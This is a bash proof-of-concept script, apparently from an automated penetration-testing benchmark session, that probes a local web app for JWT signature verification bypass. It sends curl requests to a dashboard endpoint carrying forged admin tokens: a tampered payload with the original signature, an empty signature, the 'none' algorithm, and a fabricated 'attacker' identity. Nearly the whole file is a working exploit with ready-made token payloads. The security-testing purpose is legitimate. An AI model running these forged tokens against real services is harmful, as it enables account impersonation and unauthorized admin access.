#!/bin/bash
# POC: Demonstrates JWT signature verification bypass by testing access with modified tokens, empty signatures, none algorithm, and forged tokens
# Target: ./repo
# Created: 2025-11-04T17:33:47.287Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# JWT Signature Verification Bypass POC - v2
# Follows redirects to properly test endpoint access

TARGET="http://localhost:8080"

echo "========================================"
echo "JWT Signature Verification Bypass POC"
echo "========================================"
echo ""

# Original valid JWT from authenticated session
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"username":"test","user_id":10032,"user_type":"customer"}
ORIGINAL_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInVzZXJfaWQiOiAxMDAzMiwgInVzZXJfdHlwZSI6ICJjdXN0b21lciJ9.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"

# Modified JWT 1: Changed user_type to "admin" and user_id to 1, keeping original signature
echo "[Test 1] Modified JWT with original signature (should fail if verification enabled)"
MODIFIED_TOKEN_1="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInVzZXJfaWQiOiAxLCAidXNlcl90eXBlIjogImFkbWluIn0.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs"

RESPONSE=$(curl -s -L -w "\n%{http_code}" -b "auth_token=$MODIFIED_TOKEN_1" "$TARGET/dashboard" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✗ VULNERABLE: Accepted modified JWT with invalid signature"
    # Check if body contains dashboard content
    if echo "$BODY" | grep -q "dashboard\|admin\|protected"; then
        echo "✗ CONFIRMED: Dashboard accessible with forged admin token"
    fi
else
    echo "✓ Response code: $HTTP_CODE (expected 401/403 for invalid signature)"
fi
echo ""

# Modified JWT 2: Empty signature
echo "[Test 2] Modified JWT with empty signature (should fail)"
MODIFIED_TOKEN_2="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInVzZXJfaWQiOiAxLCAidXNlcl90eXBlIjogImFkbWluIn0."

RESPONSE=$(curl -s -L -w "\n%{http_code}" -b "auth_token=$MODIFIED_TOKEN_2" "$TARGET/dashboard" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✗ VULNERABLE: Accepted JWT with empty signature"
else
    echo "✓ Response code: $HTTP_CODE"
fi
echo ""

# Modified JWT 3: "none" algorithm
echo "[Test 3] Modified JWT with 'none' algorithm (should fail)"
# Header with "none": {"alg":"none","typ":"JWT"}
MODIFIED_TOKEN_3="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInVzZXJfaWQiOiAxLCAidXNlcl90eXBlIjogImFkbWluIn0."

RESPONSE=$(curl -s -L -w "\n%{http_code}" -b "auth_token=$MODIFIED_TOKEN_3" "$TARGET/dashboard" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✗ VULNERABLE: Accepted JWT with 'none' algorithm"
else
    echo "✓ Response code: $HTTP_CODE"
fi
echo ""

# Test 4: Create custom JWT with arbitrary user_id and admin privileges
echo "[Test 4] Creating custom forged JWT with admin privileges"
# Create a new base64 payload with user_id=999, user_type=admin
# Payload: {"username":"attacker","user_id":999,"user_type":"admin"}
CUSTOM_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJhdHRhY2tlciIsICJ1c2VyX2lkIjogOTk5LCAidXNlcl90eXBlIjogImFkbWluIn0."

RESPONSE=$(curl -s -L -w "\n%{http_code}" -b "auth_token=$CUSTOM_TOKEN" "$TARGET/dashboard" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✗ CRITICAL VULNERABILITY: Forged admin token accepted!"
    echo "   Attacker can assume arbitrary identity (user_id=999, user_type=admin)"
else
    echo "✓ Response code: $HTTP_CODE"
fi
echo ""

# Test 5: Original token (baseline)
echo "[Test 5] Original valid JWT (baseline test)"
RESPONSE=$(curl -s -L -w "\n%{http_code}" -b "auth_token=$ORIGINAL_TOKEN" "$TARGET/dashboard" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)

echo "Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ Original token accepted"
else
    echo "Note: Response code $HTTP_CODE"
fi
echo ""

echo "========================================"
echo "Analysis: If Tests 1-4 return 200, JWT signature verification is DISABLED"
echo "========================================"